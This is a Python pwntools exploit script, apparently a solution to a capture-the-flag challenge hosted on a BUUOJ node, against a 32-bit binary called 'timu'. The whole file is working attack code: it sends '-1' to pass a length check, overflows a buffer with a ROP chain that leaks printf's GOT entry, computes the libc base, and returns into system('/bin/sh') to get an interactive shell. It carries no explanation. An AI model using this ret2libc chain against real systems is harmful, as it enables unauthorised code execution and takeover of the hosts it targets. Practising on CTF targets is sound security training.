from pwn import *
#sh=process("./timu")
sh=remote("node4.buuoj.cn",26371)
elf=ELF("./timu")
#libc=ELF("/lib/i386-linux-gnu/libc.so.6")
libc=ELF("./libc-2.23.so")

printf_plt=p32(elf.plt["printf"])
printf_got=p32(elf.got["printf"])
main_addr=p32(0x080485B8)
format_str=p32(0x080486F8)

sh.sendline(b'-1')
payload=0x30*b'a'+printf_plt+main_addr+format_str+printf_got
sh.sendline(payload)
#print("recv =",sh.recv())
sh.recvuntil(b"You said: ")
sh.recvuntil(b"You said: ")
printf_addr=u32(sh.recv(4))
print("printf_addr =",hex(printf_addr))

libc_base=printf_addr-libc.sym["printf"]
system_addr=p32(libc_base+libc.sym["system"])
bin_sh=p32(libc_base+next(libc.search(b"/bin/sh")))
sh.sendline(b'-1')
payload=0x30*b'a'+system_addr+p32(0xdeadbeef)+bin_sh
sh.sendline(payload)
sh.interactive()
